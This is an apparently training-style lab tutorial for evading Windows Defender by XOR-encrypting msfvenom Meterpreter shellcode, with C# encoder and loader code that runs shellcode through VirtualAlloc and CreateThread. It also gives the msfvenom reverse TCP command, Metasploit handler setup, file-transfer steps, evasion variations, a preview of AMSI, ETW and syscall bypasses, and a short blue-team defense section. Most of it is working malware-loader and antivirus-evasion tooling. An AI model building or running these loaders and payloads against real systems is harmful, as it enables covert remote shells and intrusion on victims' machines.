# Document 06: Encoding Evasion - XOR Encryption

## Where We Are

You finished Document 05. You built Loader 01 (the basic shellcode loader), ran it on the target (kimjongun, 192.168.10.100), and Defender caught it. You saw the detection in Windows Security Protection History. You know exactly what Defender flagged:

- The raw shellcode .bin file matched known msfvenom byte signatures on disk
- The VirtualAlloc + CreateThread API pattern is a known injection sequence
- The PAGE_EXECUTE_READWRITE (0x40) flag is suspicious because normal programs do not need memory that is writable and executable at the same time

You can write C# programs, call Windows API functions with DllImport, allocate memory, copy bytes, create threads, and read the results in Protection History.

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

In Document 05, Defender caught your shellcode before it could execute. One of the first things Defender does is scan files on disk. When you transferred the raw shellcode .bin file to the target, Defender scanned it and matched the bytes against its signature database. The match was instant because msfvenom shellcode contains well-known byte patterns that every antivirus product recognizes.

This document solves one of those problems. You will XOR-encrypt the shellcode so the .bin file on disk looks like random data. Defender's static signature scanner cannot match bytes that have been scrambled.

**This does NOT get you a callback.** The encrypted file survives disk scanning, which is progress, but the loader binary itself still gets caught. It still uses DllImport for VirtualAlloc and CreateThread (which puts those function names in the binary's import table where Defender can read them) and still allocates PAGE_EXECUTE_READWRITE memory. Defender's behavioral detection layer catches the loader just like it caught Loader 01.

Why build it then? Because you need to understand each evasion layer one at a time. XOR encryption solves the "shellcode file on disk" problem. Direct syscalls (Document 07) solve the "API hooks" problem. AMSI patching (Document 08) solves the ".NET runtime scanning" problem. Each document removes one detection layer. When you combine them all in Document 10, every layer is handled and you get your first fully stealthy callback.

Think of it as fixing one thing at a time instead of trying to fix everything at once.

## How This Works

### What XOR Does to Data

XOR is a binary operation. You take two values, compare them bit by bit, and produce a result. The rule is:

- If the two bits are the same (both 0 or both 1), the result is 0
- If the two bits are different (one is 0 and the other is 1), the result is 1

Here is XOR applied to two bytes:

```
Data byte:   01001101  (decimal 77, the letter 'M')
Key byte:    10110010  (decimal 178)
XOR result:  11111111  (decimal 255)
```

The important property of XOR: **it is reversible.** If you XOR the result with the same key, you get the original data back.

```
Result byte: 11111111  (decimal 255)
Key byte:    10110010  (decimal 178)
XOR result:  01001101  (decimal 77, the letter 'M' again)
```

This means the same function can encrypt and decrypt. XOR with the key once to encrypt. XOR with the key again to decrypt. No separate decrypt algorithm needed.

### Why XOR Defeats Static Scanning

Defender's signature database contains byte sequences from known malware. When Defender scans a file, it reads the bytes and checks if any sequence matches a known signature.

Msfvenom shellcode has specific byte patterns that identify it. For example, the staging code that connects back to your IP, the Meterpreter handshake bytes, and the API hashing routines all contain recognizable sequences.

When you XOR every byte of the shellcode with a key, every byte changes. The result is different from the original.

| Byte position | Original shellcode | XOR key byte | Encrypted result |
|---|---|---|---|
| 0 | 0xFC | 0x4A | 0xB6 |
| 1 | 0x48 | 0x7F | 0x37 |
| 2 | 0x83 | 0x2B | 0xA8 |
| 3 | 0xE4 | 0x9D | 0x79 |

The encrypted bytes (0xB6, 0x37, 0xA8, 0x79) do not match any signature in Defender's database because those bytes are not from any known malware. They are the result of a mathematical operation that produces seemingly random output.

### Multi-Byte Keys vs Single-Byte Keys

A single-byte key means you XOR every byte with the same value. If your key is 0x4A, then byte 0 is XORed with 0x4A, byte 1 is XORed with 0x4A, byte 2 is XORed with 0x4A, and so on.

The problem: if the shellcode has repeating patterns (and it does, because API hashing loops repeat similar instructions), a single-byte XOR produces repeating patterns in the output. Frequency analysis can detect this and recover the key.

A multi-byte key (like 16 bytes) means byte 0 is XORed with key byte 0, byte 1 with key byte 1, byte 2 with key byte 2, all the way to byte 15 with key byte 15, then byte 16 wraps around and uses key byte 0 again. This is called a repeating key cipher.

With 16 random key bytes, the output looks random enough to defeat both signature matching and basic frequency analysis.

### What Defender Still Sees

XOR encryption solves one problem. Here is what it does NOT solve:

**The loader binary's import table.** When you compile a C# program that uses DllImport for VirtualAlloc and CreateThread, the compiler writes those function names into the binary's PE header. Defender can read those names without running the program. A binary that imports VirtualAlloc + CreateThread from kernel32.dll is suspicious.

**The PAGE_EXECUTE_READWRITE allocation.** When the loader runs and calls VirtualAlloc with 0x40 (read-write-execute), Defender's runtime monitoring sees that call. Normal programs do not request memory with all three permissions at once.

**The thread creation pointing to dynamically allocated memory.** When CreateThread receives a start address inside a VirtualAlloc block, that is a textbook shellcode injection pattern.

These are behavioral detections that happen at runtime, not file scanning. XOR encryption only defeats file scanning. The other layers catch the loader anyway.

This is why Loader 02 still gets caught even though the encrypted shellcode file survives disk scanning.

## What Defender Does

Defender runs six detection layers. Here is which ones Loader 02 defeats and which ones still catch it:

| Layer | What it does | Does Loader 02 defeat it? |
|---|---|---|
| Static file scanning | Scans files on disk for known byte signatures | YES - encrypted .bin file does not match any signatures |
| Cloud analysis | Sends file hashes and suspicious samples to Microsoft's cloud for analysis | PARTIAL - encrypted file hash is unknown, but loader binary itself may be flagged |
| AMSI | Scans .NET code at runtime before execution | NO - AMSI can see the decrypted shellcode bytes in managed memory |
| API hooks in ntdll.dll | Monitors Windows API calls (VirtualAlloc, CreateThread) | NO - the loader calls these APIs normally through DllImport |
| ETW telemetry | Logs process behavior events | NO - allocation and thread creation events are logged |
| Behavioral ML | Machine learning model that scores process behavior | NO - the VirtualAlloc + write + execute pattern matches injection heuristics |

The encrypted .bin file is the only thing that survives. The loader binary and its runtime behavior are caught by layers 3 through 6.

## The Evasion Technique

What Loader 02 does differently from Loader 01:

**Loader 01** reads raw shellcode bytes from a .bin file. Those bytes are the actual msfvenom payload. Defender scans the file and matches the bytes instantly.

**Loader 02** has two parts:

1. An **encoder** that takes the raw shellcode and XOR-encrypts it with a random 16-byte key. The output is an encrypted .bin file that looks like random data.
2. A **loader** that reads the encrypted file, converts the hex key string back to bytes, XOR-decrypts the shellcode in RAM, and executes it.

The encrypted file can sit on disk without being flagged by Defender's file scanner. The decryption happens in RAM. The decrypted shellcode only exists in memory, never on the hard drive.

But the loader binary itself still has the suspicious DllImport entries and still makes the suspicious API calls at runtime, so Defender catches it through behavioral detection.

## Getting the Loader Onto the Target

The three-machine workflow for this loader:

1. **Kali (192.168.10.200):** Generate raw shellcode with msfvenom, host it on a Python HTTP server.
2. **Dev box (ammulu, 192.168.10.150):** Download shellcode from Kali. Compile both the encoder and the loader. Run the encoder to XOR-encrypt the shellcode. Host the compiled loader and encrypted shellcode on a Python HTTP server.
3. **Target (kimjongun, 192.168.10.100):** Download xor_loader.exe and encrypted.bin from the dev box. Run the loader.

You need to transfer two files to the target:

1. **xor_loader.exe** - the compiled loader binary
2. **encrypted.bin** - the XOR-encrypted shellcode file

The encrypted.bin file will survive Defender's real-time file scanning on the target because its bytes do not match any known signatures. The xor_loader.exe binary is a compiled C# program that Defender may or may not flag on disk (it depends on whether the import table pattern matches Defender's heuristic rules).

**Transfer method:** Compile and encrypt on the dev box, then use a Python HTTP server on the dev box to host both files. Download them on the target.

On the dev box (ammulu), after compiling and encrypting:
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun), PowerShell:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/xor_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\xor_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

When Defender on the target scans encrypted.bin on write, it finds no matching signatures. The file stays on disk.

When Defender scans xor_loader.exe, it may or may not flag it depending on Defender's current heuristic rules for the import table pattern. If it does flag the binary on disk, you need the evasion techniques from later documents (07, 08) to fix that.

**AMSI implications:** This loader is a compiled .exe, not a PowerShell script, so AMSI scanning of PowerShell commands is not the main concern here. However, AMSI also hooks into .NET runtime loading, which means AMSI can inspect the managed code at load time. Document 08 covers patching AMSI to prevent this.

**ETW telemetry:** When the loader runs, ETW logs the VirtualAlloc call, the memory protection change, and the CreateThread call. These events go to Defender's behavioral analysis engine. Document 08 also covers patching ETW to stop this logging.

**Reference:** `lab/loaders/02_xor_encoder.cs`

## Teaching the Code

Loader 02 has two modes: encoder mode and loader mode. Both are in the same file (`lab/loaders/02_xor_encoder.cs`). The C# preprocessor directive `#if ENCODER` controls which mode compiles. Let us start with the shared parts.

### The DllImport Declarations

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);
```

These are the same DllImport lines from Loader 01. VirtualAlloc asks Windows for a block of RAM. CreateThread starts a new thread that begins executing at a specific memory address. Both functions come from kernel32.dll.

These DllImport lines are also what gets the loader caught. When the C# compiler sees DllImport, it writes the function names (VirtualAlloc, CreateThread) into the binary's import table. Defender reads the import table and sees a program importing memory allocation and thread creation functions from kernel32.dll, which matches the shellcode injection pattern.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
```

WaitForSingleObject tells the main thread to wait until the shellcode thread finishes. Without this, the program exits immediately and kills the shellcode thread before it can do anything.

### The Constants

```csharp
const uint MEM_COMMIT = 0x1000;
const uint MEM_RESERVE = 0x2000;
const uint PAGE_EXECUTE_READWRITE = 0x40;
```

MEM_COMMIT (0x1000) tells Windows to assign physical memory pages. MEM_RESERVE (0x2000) tells Windows to reserve the address range first. When you combine them with `MEM_COMMIT | MEM_RESERVE`, Windows does both steps at once.

PAGE_EXECUTE_READWRITE (0x40) is the permission flag. It means the allocated memory can be read, written, and executed. This flag is suspicious because normal programs do not need memory that is executable and writable at the same time. Document 05 showed a variation using two-step allocation (allocate as RW, write data, change to RX) which avoids this flag, but Loader 02 uses 0x40 for simplicity.

### The XOR Function

This is the core of the evasion technique. The same function encrypts and decrypts.

```csharp
static byte[] XorCrypt(byte[] data, byte[] key)
{
    byte[] result = new byte[data.Length];
```

The function takes two inputs: the data bytes and the key bytes. It creates a new array called `result` that is the same size as the data. It does not modify the original data.

```csharp
    for (int i = 0; i < data.Length; i++)
    {
        result[i] = (byte)(data[i] ^ key[i % key.Length]);
    }
    return result;
}
```

The loop goes through every byte of data. For each byte, it XORs it with the corresponding key byte. The `%` operator (modulo) handles the key wrapping: when `i` reaches the key length, `i % key.Length` wraps back to 0. So if the key is 16 bytes, byte 0 uses key[0], byte 15 uses key[15], byte 16 uses key[0] again.

The `^` symbol is the XOR operator in C#. `data[i] ^ key[i % key.Length]` XORs one data byte with one key byte and produces one result byte. The `(byte)` cast is needed because C# promotes the result to an integer, and we need to store it back as a byte.

### The Key Generator

```csharp
static byte[] GenerateKey(int length)
{
    byte[] key = new byte[length];
    Random rng = new Random();
    rng.NextBytes(key);
    return key;
}
```

This creates a random key of the specified length. `Random` is C#'s built-in random number generator. `NextBytes` fills the entire byte array with random values between 0 and 255. The default key length is 16 bytes (128 bits), which is enough randomness to defeat signature matching and basic frequency analysis.

Each time you run the encoder, it generates a new random key. This means the same shellcode encrypted twice produces different output. Defender cannot build a signature for "XOR-encrypted msfvenom shellcode" because the encrypted bytes are different every time.

### The Hex Converter

```csharp
static byte[] HexToBytes(string hex)
{
    byte[] bytes = new byte[hex.Length / 2];
    for (int i = 0; i < bytes.Length; i++)
    {
        bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
    }
    return bytes;
}
```

When the encoder prints the key, it prints it as a hex string like `4A7F2B9D...`. The loader needs to convert that hex string back into bytes. Each pair of hex characters represents one byte. `Convert.ToByte("4A", 16)` converts the hex string "4A" to the byte value 74 (0x4A). The second argument `16` tells C# the string is in base 16 (hexadecimal).

### Encoder Mode

The encoder is the first half of the Main function, inside the `#if ENCODER` block.

```csharp
#if ENCODER
    if (args.Length < 2)
    {
        Console.WriteLine("XOR Encoder");
        Console.WriteLine("Usage: xor_encode.exe <input_shellcode.bin> <output_encrypted.bin> [key_length]");
        return;
    }

    string inputPath = args[0];
    string outputPath = args[1];
```

The encoder takes command-line arguments: the input file (raw shellcode) and the output file (encrypted shellcode). An optional third argument sets the key length (default is 16 bytes).

```csharp
    int keyLength = 16;
    if (args.Length >= 3)
    {
        keyLength = int.Parse(args[2]);
    }
```

You can make the key longer (32, 64 bytes) for more randomness, but 16 bytes is already sufficient. No antivirus product does the kind of cryptanalysis needed to break 16-byte XOR in a real-time scan.

```csharp
    byte[] rawShellcode = File.ReadAllBytes(inputPath);
    Console.WriteLine("[*] Read " + rawShellcode.Length + " bytes of shellcode.");
```

`File.ReadAllBytes` reads every byte from the input file into a byte array. For a standard Meterpreter reverse TCP payload, this is around 500-600 bytes.

```csharp
    byte[] key = GenerateKey(keyLength);
    string keyHex = BitConverter.ToString(key).Replace("-", "");
    Console.WriteLine("[+] XOR Key (" + keyLength + " bytes): " + keyHex);
    Console.WriteLine("[!] SAVE THIS KEY. You need it to run the loader.");
```

After generating the random key, it converts the key bytes to a hex string for printing. `BitConverter.ToString` produces output like `4A-7F-2B-9D`, and `.Replace("-", "")` removes the dashes to get `4A7F2B9D`. You need to copy this hex string and pass it to the loader later.

```csharp
    byte[] encrypted = XorCrypt(rawShellcode, key);
    File.WriteAllBytes(outputPath, encrypted);
```

The encoder calls the XorCrypt function to encrypt the shellcode, then writes the encrypted bytes to the output file. This output file is safe to transfer to the target. Defender will scan it on disk and find no matching signatures because every byte has been transformed by XOR.

### Loader Mode

The loader is the second half of the Main function, inside the `#else` block (runs when you compile without `/define:ENCODER`).

```csharp
#else
    if (args.Length < 2)
    {
        Console.WriteLine("XOR Shellcode Loader");
        Console.WriteLine("Usage: xor_loader.exe <encrypted_shellcode.bin> <xor_key_hex>");
        return;
    }

    string encryptedPath = args[0];
    string keyHexArg = args[1];
```

The loader takes two arguments: the path to the encrypted shellcode file and the XOR key as a hex string (the same key the encoder printed).

```csharp
    byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
    byte[] xorKey = HexToBytes(keyHexArg);
```

Read the encrypted bytes from the file and convert the hex key string back to bytes.

```csharp
    byte[] shellcode = XorCrypt(encryptedShellcode, xorKey);
    Console.WriteLine("[+] Shellcode decrypted in memory.");
```

This is where the decryption happens. XorCrypt takes the encrypted bytes and the key, XORs them, and produces the original shellcode. The decrypted shellcode now exists only in RAM, inside the `shellcode` byte array. It was never written to disk in decrypted form.

```csharp
    IntPtr memoryAddress = VirtualAlloc(
        IntPtr.Zero,
        (uint)shellcode.Length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
```

This allocates RAM with read-write-execute permissions (0x40). This is the same call from Loader 01. The 0x40 flag is one of the things that gets this loader caught, because Defender's runtime monitoring watches for RWX allocations.

```csharp
    Marshal.Copy(shellcode, 0, memoryAddress, shellcode.Length);
```

Copy the decrypted shellcode bytes from the C# byte array into the allocated RAM block. After this call, the shellcode bytes exist in two places: the `shellcode` byte array and the VirtualAlloc block.

```csharp
    Array.Clear(shellcode, 0, shellcode.Length);
```

This zeros out the shellcode byte array. After copying the shellcode into the VirtualAlloc block, the managed byte array is no longer needed. Zeroing it reduces the window where Defender's memory scanner could find the decrypted shellcode in two locations. The shellcode still exists in the VirtualAlloc block where it will be executed.

```csharp
    IntPtr threadHandle = CreateThread(
        IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero
    );

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

Create a thread that starts executing at the VirtualAlloc address (where the shellcode is), then wait for it to finish. `0xFFFFFFFF` means wait forever. This is the same execution pattern as Loader 01.

### The Complete Loader File

The complete source code is at `lab/loaders/02_xor_encoder.cs`. It contains both encoder and loader modes in a single file, controlled by the `#if ENCODER` preprocessor directive.

## Compilation and Execution

### Step 1: Generate Shellcode on Kali

Open a terminal on Kali (192.168.10.200) and generate a Meterpreter reverse TCP payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
```

This creates payload.bin containing raw shellcode bytes. Replace the IP and port with your Kali machine's values.

### Step 2: Compile the Encoder on the Dev Box

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022 and compile the encoder:

```
csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
```

The `/define:ENCODER` flag tells the compiler to include the code inside the `#if ENCODER` block and skip the `#else` block. The result is xor_encode.exe, which only encrypts shellcode and does not import any suspicious Windows API functions.

### Step 3: Compile the Loader on the Dev Box

```
csc /unsafe /out:xor_loader.exe 02_xor_encoder.cs
```

Without the `/define:ENCODER` flag, the compiler includes the `#else` block (the loader code) and skips the `#if ENCODER` block. The `/unsafe` flag is needed because Marshal.Copy works with unmanaged memory.

### Step 4: Encrypt the Shellcode

Transfer payload.bin from Kali to the dev box (ammulu). On Kali, host it with `python3 -m http.server 8080`. On the dev box, download it with `Invoke-WebRequest -Uri http://192.168.10.200:8080/payload.bin -OutFile C:\Users\ammulu\Desktop\payload.bin`. Then run the encoder on the dev box:

```
xor_encode.exe payload.bin encrypted.bin
```

Expected output:

```
[*] Read 510 bytes of shellcode.
[+] XOR Key (16 bytes): 4A7F2B9DE3A1C084F56D1B8E97320AF6
[!] SAVE THIS KEY. You need it to run the loader.
[+] Encrypted shellcode written to: encrypted.bin
[+] Original size: 510 bytes
[+] Encrypted size: 510 bytes
```

**Copy the hex key.** You need it in the next step. The key will be different every time you run the encoder because it generates a random key.

### Step 5: Set Up Your Listener on Kali

Before running the loader, start a Metasploit listener on Kali:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

The listener waits for an incoming connection from the shellcode.

### Step 6: Transfer to Target and Run the Loader

Transfer xor_loader.exe and encrypted.bin from the dev box to the target. On the dev box, start a Python HTTP server (`python -m http.server 8080` in the directory with both files). On the target (kimjongun, 192.168.10.100), download them:

```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/xor_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\xor_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

On the target, open a command prompt and run:

```
xor_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with the one your encoder printed.

**What happens next: Defender blocks this.**

You will see one of these outcomes:

**Outcome A: Defender blocks the binary on execution.** Defender's real-time protection detects the VirtualAlloc + CreateThread pattern when the loader runs. You see a notification that says "Threat blocked" or "Action needed." The loader process terminates before the shellcode can execute.

**Outcome B: Defender quarantines the binary on launch.** The binary's import table (which lists VirtualAlloc and CreateThread) triggers Defender's heuristic scan. Defender removes the file before it can run.

Either way, you do NOT get a callback on your Metasploit listener. The encrypted.bin file is still on disk because it passed the signature scan, but the loader binary itself was caught.

### Step 7: Check Protection History

Open Windows Security and go to **Virus & threat protection > Protection history**. You will see:

- The detection entry for xor_loader.exe
- The category (likely "Trojan" or "HackTool")
- The action Defender took (quarantined, blocked, or removed)
- The timestamp

Note what is NOT in Protection History: encrypted.bin. Defender did not flag the encrypted shellcode file because it does not match any known signatures. The XOR encryption worked for the file on disk. The problem is the loader binary and its behavior at runtime.

## Confirming Success

Success in this document means understanding three things:

1. **The encrypted shellcode file survived disk scanning.** Check that encrypted.bin is still present on your Desktop. It was not quarantined or deleted. Open Windows Security Protection History and confirm there is no entry for encrypted.bin. This proves that XOR encryption defeated Defender's static signature matching on disk.

2. **The loader binary was caught.** Check Protection History for the xor_loader.exe detection. Read the detection name and category. This tells you what Defender flagged. The loader was caught because of its import table pattern (VirtualAlloc + CreateThread via DllImport) and its runtime behavior (RWX allocation + thread creation at that address).

3. **You did not get a callback.** Check your Metasploit listener on Kali. No session was opened. Defender stopped the loader before the shellcode could connect back.

You now understand that XOR encryption solves the disk scanning problem but does not solve the behavioral detection problem. The next documents address those other detection layers.

## What Was Gained

You can now:

- Encrypt shellcode with XOR so it survives Defender's disk scanning
- Understand how the XOR cipher works (same function encrypts and decrypts, key wraps with modulo)
- Separate the encoder (runs anywhere, produces encrypted files) from the loader (runs on target, decrypts and executes)
- Explain why single-byte XOR is weak and multi-byte XOR is stronger
- Identify what Defender still catches: import table patterns, RWX allocations, thread creation behavior

You have NOT bypassed Defender yet. You have solved one of six detection layers. Document 07 (Direct Syscalls) addresses the next problem: the API hooks in ntdll.dll. Document 07 teaches Loader 03, which is the **first loader that actually survives Defender** because it uses dynamic API resolution instead of DllImport, which keeps the suspicious function names out of the import table and bypasses Defender's hooks.

## Common Threats and Variations

### Variation 1: AES Instead of XOR

AES (Advanced Encryption Standard) is a stronger encryption algorithm than XOR. AES uses a 256-bit key and produces output that is cryptographically secure, while XOR with a short repeating key can theoretically be broken with frequency analysis.

In practice, the difference does not matter for evasion. Defender's signature scanner checks for known byte patterns, not encryption strength. Both XOR and AES produce output that does not match any signatures. XOR is simpler to implement and does not require importing System.Security.Cryptography.

Some operators prefer AES because it makes the encrypted payload harder to analyze in reverse engineering. If a forensic analyst finds your encrypted.bin file, breaking 16-byte XOR is feasible with enough ciphertext, but breaking AES-256 is not. For a red team engagement where you want to protect your payload from analysis, AES is the better choice.

### Variation 2: Embedding the Key in the Binary

Instead of passing the key as a command-line argument, you can embed it directly in the loader's source code. This means the loader only takes one argument (the encrypted file path).

The tradeoff: the key is now inside the binary. If a blue team member decompiles the loader (C# decompiles easily with tools like dnSpy), they can extract the key and decrypt your shellcode. Passing the key as an argument means the binary alone is not enough to decrypt the payload.

For operations where you control the execution and the binary is not likely to be captured for analysis, embedding the key is more convenient. For engagements where the binary might be found, keeping the key separate adds a layer of protection.

### Variation 3: Encoding the Encrypted Bytes as Base64

Instead of writing raw encrypted bytes to a .bin file, you can Base64-encode them and store the result as a text file or embed them as a string in C# source code.

```csharp
string encodedShellcode = "szcopyouB64stringhere...";
byte[] encrypted = Convert.FromBase64String(encodedShellcode);
```

This lets you embed the encrypted shellcode directly in the loader's source code instead of reading from a separate file. No file transfer needed for the shellcode. The downside is that Base64 increases the size by about 33% (every 3 bytes become 4 characters), and the string is visible in the decompiled binary.

## Detection and Defense (Blue Team Perspective)

**Deploy behavioral detection, not just signature scanning.** Signature scanning only catches known byte patterns. XOR encryption defeats it trivially. Behavioral detection watches what programs DO (allocate executable memory, create threads at dynamic addresses) rather than what they contain.

Blue team action: ensure your EDR product monitors VirtualAlloc and CreateThread calls, not just file signatures. Alert on any process that allocates RWX memory from outside the system process list.

**Monitor for unknown binaries importing memory APIs.** The loader's import table lists VirtualAlloc and CreateThread from kernel32.dll. Most legitimate programs do not import these functions. An allowlist-based approach (only permit known binaries that need these APIs) catches custom-compiled loaders regardless of their payload.

Blue team action: use application control policies (Windows Defender Application Control or AppLocker) to restrict which binaries can run. Only signed, known binaries should be permitted in production environments.

**Scan memory at runtime, not just files on disk.** The decrypted shellcode exists in RAM after the loader runs. Memory scanning tools can detect known shellcode patterns in process memory even after XOR encryption is stripped.

Blue team action: configure your EDR to perform periodic memory scans of running processes. Look for known Meterpreter shellcode byte sequences in allocated memory regions.

**Watch for files that appear random but are consumed by binaries.** An encrypted.bin file full of random-looking bytes that is read by a process which then allocates executable memory is suspicious. Correlating file reads with memory allocations catches the XOR loader pattern regardless of the encryption used.

Blue team action: configure your SIEM to correlate "file read" events with "RWX memory allocation" events from the same process within a short time window.

## What Comes Next

Document 07 (lab/materials/07_direct_syscalls.md) teaches Loader 03, which solves the next problem: Defender's API hooks in ntdll.dll. Instead of using DllImport (which puts function names in the import table), Loader 03 uses GetProcAddress to find function addresses at runtime. Instead of calling VirtualAlloc through kernel32.dll (where Defender hooks the calls), Loader 03 calls NtAllocateVirtualMemory directly through ntdll.dll. The function names are built from integer offsets at runtime so they never appear as strings in the binary.

Loader 03 is the first loader that survives Defender because it avoids the import table patterns and bypasses the API hooks that caught Loaders 01 and 02.
